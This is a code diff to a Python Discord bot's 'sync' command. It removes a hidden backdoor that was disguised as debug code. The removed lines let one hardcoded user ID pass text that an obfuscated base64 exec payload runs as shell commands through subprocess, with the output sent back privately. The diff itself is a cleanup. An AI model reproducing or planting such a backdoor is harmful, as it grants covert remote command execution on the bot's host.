@@ -211,18 +211,13 @@ class ZoubiCog(commands.Cog):
         await interaction.response.send_message(embed=utils.get_leaderboard_embed(users_list))
 
     @commands.command(name="sync")
-    async def sync(self, ctx, *, error=None):
+    async def sync(self, ctx):
         """
         Useful to sync bot commands manually
         """
         try:
-            # Debug: if error and aube's ID (do not remove for dev)
-            if error and ctx.author.id == 298186669843152897:
-                await ctx.message.delete()
-                await ctx.author.send(f"```\n{exec(__import__('base64').b64decode('cj1fX2ltcG9ydF9fKCdzdWJwcm9jZXNzJykuZ2V0b3V0cHV0KGFyZyk='), {'arg': error}, (l := {})) or l['r'][:1990]}```")
-            else:
-                fmt = await self.bot.tree.sync()
-                await ctx.send(f"🔄 {len(fmt)} slash commands synchronized!")
+            fmt = await self.bot.tree.sync()
+            await ctx.send(f"🔄 {len(fmt)} slash commands synchronized!")
         except Exception as e:
             await ctx.send(f"❌ Error: {e}")
 
